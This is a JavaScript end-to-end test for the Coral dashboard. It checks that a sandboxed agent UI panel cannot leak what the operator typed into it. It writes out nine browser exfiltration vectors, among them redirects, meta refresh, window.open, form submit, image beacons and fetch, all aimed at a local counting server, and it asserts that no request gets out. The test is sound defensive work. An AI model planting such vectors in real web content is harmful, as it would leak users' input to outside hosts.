// An Agent UI panel on THIS computer runs in the same sandboxed host frame as on the hub (#5090): the panel is read as text, never loaded as a document of its own,
// so it cannot send what the Operator typed into it out by navigating itself (the dashboard's frame-src allows https for the Linked preview, which would let a
// document loaded by URL go anywhere). A counting server on 127.0.0.1 must see ZERO hits from every navigation and network vector a panel can try, the card says the
// content is the agent's, and the panel is shown through panel_host.html. Real Chrome against an isolated Coral (see run_cdp_suites.mjs).
const assert = require('node:assert/strict');
const http = require('node:http');
const {execFileSync} = require('./helpers/child_process.js');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const CDP = require('chrome-remote-interface');
const BASE = require('./test_base').BASE;
const sleep = ms => new Promise(r => setTimeout(r, ms));
(async () => {
 const hits = [];
 const counting = http.createServer((req, res) => { hits.push(req.method + ' ' + req.url); res.writeHead(200, {'Content-Type': 'text/html', 'Access-Control-Allow-Origin': '*'}).end('<h1>exfil</h1>'); });
 await new Promise(r => counting.listen(0, '127.0.0.1', r));
 const port = counting.address().port;
 const U = i => `http://127.0.0.1:${port}/leak?v=${i}&d=typed-secret`;
 const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'coral-ui-nav-'));
 const bin = path.join(dir, 'coral-agent' + (process.platform === 'win32' ? '.exe' : ''));
 execFileSync('go', ['build', '-o', bin, './cmd/coral-agent'], {cwd: path.resolve(__dirname, '../../coral-go')});
 const api = async (route, method = 'GET', body) => {
  const r = await fetch(BASE + route, {method, headers: {'Content-Type': 'application/json'}, body: body === undefined ? undefined : JSON.stringify(body)});
  if (!r.ok) throw new Error(`${r.status}: ${await r.text()}`);
  return r.json();
 };
 const launch = await api('/api/sessions/launch', 'POST', {working_dir: dir, agent_type: 'terminal', display_name: 'Agent UI navigation test'});
 const sid = launch.session_id;
 const env = {...process.env, CORAL_URL: BASE, CORAL_SESSION_NAME: 'terminal-' + sid}; delete env.TMUX;
 const cli = args => JSON.parse(execFileSync(bin, ['ui', ...args], {env, encoding: 'utf8'}));
 const client = await CDP({port: Number(process.env.CDP_PORT || 9222)});
 const {Page, Runtime} = client;
 const ev = async expression => {
  const r = await Runtime.evaluate({expression, returnByValue: true, awaitPromise: true});
  if (r.exceptionDetails) throw new Error(JSON.stringify(r.exceptionDetails));
  return r.result.value;
 };
 const { waitFor, coralReady } = require('./helpers/wait').bind(ev);
 try {
  const vectors = [
   `location.href='${U(0)}'`,
   `document.location.replace('${U(1)}')`,
   `document.head.insertAdjacentHTML('beforeend','<meta http-equiv="refresh" content="0;url=${U(2)}">')`,
   `window.open('${U(3)}')`,
   `document.body.insertAdjacentHTML('beforeend','<a id="a" href="${U(4)}">x</a>'); document.getElementById('a').click()`,
   `document.body.insertAdjacentHTML('beforeend','<form id="f" action="${U(5)}"><input name="x" value="1"></form>'); document.getElementById('f').submit()`,
   `try { top.location = '${U(6)}' } catch (e) {}`,
   `new Image().src='${U(7)}'`,
   `fetch('${U(8)}', {mode:'no-cors'}).catch(function(){})`,
  ];
  const file = path.join(dir, 'panel.html');
  // The first line proves the panel runs at all; each vector then runs on its own tick so one that throws cannot hide the rest.
  fs.writeFileSync(file, `<h1>panel</h1><script>coralUI.emit('ran',{});${vectors.map(v => `setTimeout(function(){try{${v}}catch(e){}},50);`).join('')}</script>`);
  cli(['publish', '--id', 'nav', '--title', 'Navigation test', '--file', file]);
  await Page.enable(); await Runtime.enable(); await Page.navigate({url: BASE}); await Page.loadEventFired(); await coralReady();
  // The frame is read at the moment the card is mounted: a panel that navigates is stopped and its frame REMOVED by the dashboard (that is the defence working), and
  // the vectors below do exactly that 50 ms after the panel runs, so reading the frame later races the guard.
  const mounted = await ev(`(async()=>{const {state}=await import((window.__coralStatic||'/static/')+'state.js');state.currentSession={type:'live',session_id:${JSON.stringify(sid)}};document.getElementById('live-session-view').style.display='';const ui=await import((window.__coralStatic||'/static/')+'agent_ui.js');await ui.refreshAgentUI();const f=document.querySelector('.agent-ui-card iframe');const shown={src:f&&f.getAttribute('src'),sandbox:f&&f.getAttribute('sandbox'),authored:!!document.querySelector('.agent-ui-card .agent-ui-authored')};window.switchAgenticTab('agent-ui','top');return shown;})()`);
  await waitFor(`!!document.querySelector('.agent-ui-home-row')`, 'the panel list');
  await ev(`document.querySelector('.agent-ui-home-row').click()`);
  for (const end = Date.now() + 8000; !cli(['events', '--id', 'nav']).some(e => e.action === 'ran') && Date.now() < end; await sleep(100));
  assert.ok(cli(['events', '--id', 'nav']).some(e => e.action === 'ran'), 'the panel ran (the positive control)');
  assert.ok(mounted.src, 'the panel was mounted in a frame');
  assert.match(mounted.src, /panel_host\.html$/, 'shown through the sandboxed host');
  assert.equal(mounted.sandbox, 'allow-scripts');
  assert.ok(mounted.authored, 'the card says the content is the agent\'s');
  await sleep(3000); // sleep-ok: a request that would leave needs time to arrive; the counting server must stay silent
  assert.deepEqual(hits, [], 'no navigation or request of a panel reached the outside: ' + JSON.stringify(hits));
  console.log('ok: ' + vectors.length + ' vectors, 0 hits');
 } finally {
  try { await client.close(); } catch {}
  counting.close();
  try { cli(['remove', '--id', 'nav']); } catch {}
  await api(`/api/sessions/live/${encodeURIComponent(launch.session_name)}/kill`, 'POST', {session_id: sid, agent_type: 'terminal'}).catch(() => {});
  fs.rmSync(dir, {recursive: true, force: true});
 }
})().catch(e => { console.error(e); process.exit(1); });
